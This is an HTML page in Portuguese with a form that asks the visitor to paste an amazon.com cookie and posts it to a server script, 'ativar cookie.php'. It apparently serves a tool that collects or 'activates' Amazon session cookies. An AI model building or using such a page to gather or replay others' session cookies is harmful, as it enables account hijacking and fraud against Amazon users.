


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Ativar cookie amazon</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #12263f;
        }
        .container {
            background-color: #152E4D;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }
        h1 {
            text-align: center;
        }
        label, textarea {
            display: block;
            margin-bottom: 10px;
        }
        textarea {
            width: 100%;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #152E4D;
            resize: vertical;
            min-height: 150px;
        }
        input[type="submit"] {
            background-color: #0e7490;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            background-color: #0e7490;
        }
        .back-button {
            display: inline-block;
            padding: 10px 20px;
            margin-top: 10px;
            background-color: #ccc;
            color: #000;
            text-decoration: none;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        .back-button:hover {
            background-color: #999;
        }
        .error-message {
            display: none;
            color: red;
        }

        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 9998;
        }

        .loader {
            display: none;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            position: fixed;
            top: 50%;
            left: 50%;
            margin-top: -25px;
            margin-left: -25px;
            z-index: 9999;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div class="overlay" id="overlay"></div>
    <div class="loader" id="loader"></div>
        <div class="container">
            <h1>Ativar cookie</h1>
            <form id="form">
                <label for="cookieInput">Insira o cookie da amazon.com:</label>
                <textarea id="cookieInput" name="cookie" rows="6" cols="40" placeholder="Cole o seu cookie aqui..."></textarea>
                <input type="submit" name="submit" value="Ativar" onclick="submitForm(event)">
                <p class="success-message" id="successMessage" style="display: none; color: green;">Cookie ativado com sucesso!</p>
                <p class="activating-message" id="activatingMessage" style="display: none; color: red;">Ativando cookie...</p>
                <p class="error-message" id="errorMessage"></p>
                <a href="#" class="back-button" onclick="goBack()">Voltar</a>
            </form>
        </div>

    <script>
        function showSuccessMessage() {
            var successMsg = document.getElementById('successMessage');
            successMsg.style.display = 'block';
            setTimeout(function() {
                successMsg.style.display = 'none';
            }, 2000);
        }

        function showErrorMessage(message) {
            var errorMsg = document.getElementById('errorMessage');
            errorMsg.innerText = message;
            errorMsg.style.display = 'block';
        }

        function clearErrorMessage() {
            var errorMsg = document.getElementById('errorMessage');
            errorMsg.innerText = '';
            errorMsg.style.display = 'none';
        }

        function submitForm(event) {
            event.preventDefault();
            var formData = new FormData(document.getElementById('form'));
            var xhr = new XMLHttpRequest();

            var cookieInput = document.getElementById('cookieInput');
            var trimmedCookie = cookieInput.value.trim();
            
            if (trimmedCookie === '') {
                showErrorMessage('Por favor, insira um cookie.');
                return;
            }

            document.getElementById('activatingMessage').style.display = 'block';
            cookieInput.value = '';  // Limpa o campo original
            cookieInput.value = trimmedCookie; 
            document.getElementById('activatingMessage').style.display = 'block';
            cookieInput.value = '';

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
                        showSuccessMessage();
                        document.getElementById('activatingMessage').style.display = 'none';
                    } else {
                        showErrorMessage('Ocorreu um erro ao executar o código.');
                        document.getElementById('activatingMessage').style.display = 'none';
                    }
                }
            };

            xhr.open('POST', 'ativar cookie.php', true);
            xhr.send(formData);
        }

        function goBack() {
            window.history.back();
        }

        window.addEventListener('load', function() {
            var overlay = document.getElementById('overlay');
            var loader = document.getElementById('loader');
            overlay.style.display = 'block';
            loader.style.display = 'block';

            setTimeout(function() {
                overlay.style.display = 'none';
                loader.style.display = 'none';
            }, 2000); 
        });
    </script>
</body>
</html>